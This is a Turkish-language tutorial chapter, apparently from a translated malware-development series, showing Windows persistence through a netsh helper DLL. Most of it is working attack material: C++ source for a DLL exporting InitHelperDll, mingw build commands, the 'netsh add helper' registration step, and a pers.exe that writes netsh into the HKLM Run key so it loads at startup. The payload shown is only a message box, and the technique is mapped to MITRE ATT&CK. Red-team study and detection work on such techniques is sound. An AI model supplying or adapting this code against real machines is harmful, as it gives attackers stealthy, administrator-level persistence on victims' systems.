\newpage
\subsection{72. kötü amaçlı yazılım geliştirme: kalıcılık - bölüm 6. Windows netsh yardımcı DLL'i. Basit C++ örneği.}

![pers](./images/56/2022-05-29_15-24_1.png){width="80%"}    

Bu bölüm, Windows kötü amaçlı yazılım kalıcılık teknikleri ve hileleri üzerine yazılmış bir dizi makalenin bir sonraki parçasıdır.    

Bugün, kendi araştırmalarım sonucunda keşfettiğim bir başka kalıcılık tekniği olan Netsh Helper DLL hakkında yazacağım.   

### netsh

**Netsh**, Windows yöneticilerinin ana makine tabanlı Windows güvenlik duvarını değiştirmek ve ağ yapılandırma görevlerini gerçekleştirmek için kullanabileceği bir Windows yardımcı programıdır. Netsh’in işlevselliği, DLL dosyalarıaracılığıyla genişletilebilir.    

Bu özellik, kırmızı takım operatörlerinin keyfi DLL'leri yükleyerek kod yürütme gerçekleştirmesine ve dolayısıyla bu aracı kullanarak kalıcılık sağlamasına olanak tanır.    
Ancak, bu tekniğin uygulanabilmesi için yerel yönetici ayrıcalıklarıgereklidir.    

### pratik örnek

Şimdi, pratik bir örnek üzerinden ilerleyelim. Öncelikle kötü amaçlı bir DLL oluşturalım:     

```cpp
/*
evil.cpp
simple DLL for netsh
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/05/29/malware-pers-6.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

extern "C" __declspec(dllexport) 
DWORD InitHelperDll(
DWORD dwNetshVersion, PVOID pReserved) {
  MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
  return 0;
}
```

Şimdi derleyelim:    

```bash
x86_64-w64-mingw32-gcc -shared -o evil.dll evil.cpp -fpermissive
```

![pers](./images/56/2022-05-29_15-12.png){width="80%"}    

Ve bu kötü amaçlı DLL, hedef kurbanın makinesine aktarılır.    

Netsh, işletim sisteminin diğer bileşenleriyle dinamik bağlantı kitaplığı (DLL) dosyaları aracılığıyla etkileşime girer.Her Netsh yardımcı DLL'si, kapsamlı bir işlev kümesi sunar.Netsh'in işlevselliği, DLL dosyaları kullanılarak genişletilebilir ve bu da saldırganların kötü amaçlı kodlarını yürütmelerine olanak tanır:    

```powershell
reg query "HKLM\Software\Microsoft\NetSh" /s
```

![pers](./images/56/2022-05-29_15-20.png){width="80%"}    

Ardından, `add helper` komutu kullanılarak DLL, `netsh` yardımcı programına kaydedilebilir:     

```powershell
netsh
add helper Z:\2022-05-29-malware-pers-6\evil.dll
```

![pers](./images/56/2022-05-29_15-23.png){width="80%"}    

![pers](./images/56/2022-05-29_15-24.png){width="80%"}    

Her şey mükemmel çalıştı!    

Ancak, `netsh` varsayılan olarak otomatik başlatılacak şekilde yapılandırılmamıştır.
Kalıcılık, Windows başlangıcında uygulamayı çalıştıran bir kayıt defteri anahtarı oluşturarak sağlanabilir.
Bu işlem aşağıdaki komut dosyasıyla hemen gerçekleştirilebilir:   

```cpp
/*
pers.cpp
windows persistence via netsh helper DLL
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/05/29/malware-pers-6.html
*/
#include <windows.h>
#include <string.h>

int main(int argc, char* argv[]) {
  HKEY hkey = NULL;

  // netsh
  const char* netsh = "C:\\Windows\\SysWOW64\\netsh";

  // startup
  LONG res = RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
  (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 
  0 , KEY_WRITE, &hkey);
  if (res == ERROR_SUCCESS) {
    // create new registry key
    RegSetValueEx(hkey, (LPCSTR)"hack", 
    0, REG_SZ, (unsigned char*)netsh, strlen(netsh));
    RegCloseKey(hkey);
  }
  return 0;
}
```

Gördüğünüz gibi, bu yöntem [kayıt defteri çalıştırma anahtarları (run keys)](https://cocomelonc.github.io/tutorial/2022/04/20/malware-pers-1.html) aracılığıyla kalıcılık sağladığımız önceki yazımdaki betiğe benziyor.    

Kayıt defteri çalıştırma anahtarlarını kontrol etmek için aşağıdaki komutu çalıştırabilirsiniz:   

```powershell
reg query \
"HKLM\Software\Microsoft\Windows\CurrentVersion\Run" \
 /s
```

![pers](./images/56/2022-05-29_15-18.png){width="80%"}    

Şunu derleyelim:    

```bash
x86_64-w64-mingw32-g++ -O2 pers.cpp -o pers.exe \
-I/usr/share/mingw-w64/include/ -s -ffunction-sections \
-fdata-sections -Wno-write-strings -fno-exceptions \
-fmerge-all-constants -static-libstdc++ \
-static-libgcc -fpermissive
```

![pers](./images/56/2022-05-29_15-14.png){width="80%"}    

ve kurbanın makinesinde çalıştıralım:     

```powershell
.\pers.exe
```

![pers](./images/56/2022-05-29_15-21.png){width="80%"}    

Bu komut çalıştırıldığında, aşağıdaki kayıt defteri anahtarı oluşturulur:         

![pers](./images/56/2022-05-29_15-25.png){width="80%"}    

Ancak bir husus var. PoC'nin mantığının, payload yürütülürken netsh'in hala kullanılabilmesini sağlamak için yeni bir iş parçacığı oluşturacak şekilde güncellenmesi gerekir. Ancak, netsh sona erdiğinde, kötü niyetli mantığınız da sona erer.     

Şimdi deneyelim. Yeni bir DLL oluşturun (`evil2.cpp`):    

```cpp
/*
evil2.cpp
simple DLL for netsh
author: @cocomelonc
https://cocomelonc.github.io/tutorial/
2022/05/29/malware-pers-6.html
*/

#include <windows.h>
#pragma comment (lib, "user32.lib")

DWORD WINAPI Meow(LPVOID lpParameter) {
  MessageBox(NULL, "Meow-meow!", "=^..^=", MB_OK);
  return 1;
}

extern "C" __declspec(dllexport) 
DWORD InitHelperDll(
DWORD dwNetshVersion, PVOID pReserved) {
  HANDLE hl = CreateThread(NULL, 0, Meow, NULL, 0, NULL);
  CloseHandle(hl);
  return 0;
}
```

Derleyelim:

```bash
x86_64-w64-mingw32-gcc -shared -o evil2.dll evil2.cpp -fpermissive
```

![pers](./images/56/2022-05-29_16-21.png){width="80%"}    

ve adımları tekrar çalıştırın:

```powershell
netsh
add helper Z:\2022-05-29-malware-pers-6\evil2.dll
```

![pers](./images/56/2022-05-29_16-23.png){width="80%"}    

Gördüğünüz gibi, her şey yolunda, `netsh` hala kullanılabilir. Ve kayıt defteri anahtarını doğruluk açısından kontrol edebiliriz:     

```powershell
reg query "HKLM\Software\Microsoft\NetSh" /s
```

![pers](./images/56/2022-05-29_16-23_1.png){width="80%"}    

Bu tür bir saldırı, sistem özelliklerinin istismarına dayandığı için önleyici kontrollerle kolayca engellenemez.   

[netsh](https://docs.microsoft.com/en-us/windows-server/networking/technologies/netsh/netsh-contexts)    
[MITRE ATT&CK: Netsh Helper DLL](https://attack.mitre.org/techniques/T1546/007/)    
[github'taki kaynak kod](https://github.com/cocomelonc/2022-05-29-malware-pers-6)    
